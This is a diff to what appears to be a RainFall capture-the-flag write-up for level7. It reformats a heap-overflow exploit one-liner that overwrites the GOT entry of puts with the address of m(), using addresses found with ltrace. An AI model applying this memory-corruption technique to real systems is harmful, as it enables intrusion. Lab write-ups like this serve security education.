@@ -50,7 +50,8 @@ level7@RainFall:~$ ltrace ./level7 AAAAAAAA BBBBBBBB
   
   address of puts `0x8049928` and address of m() function `0x080484f4`
   
-  ./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
+  
+  `./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')`
   
   Heap after srcpy 1
   ```
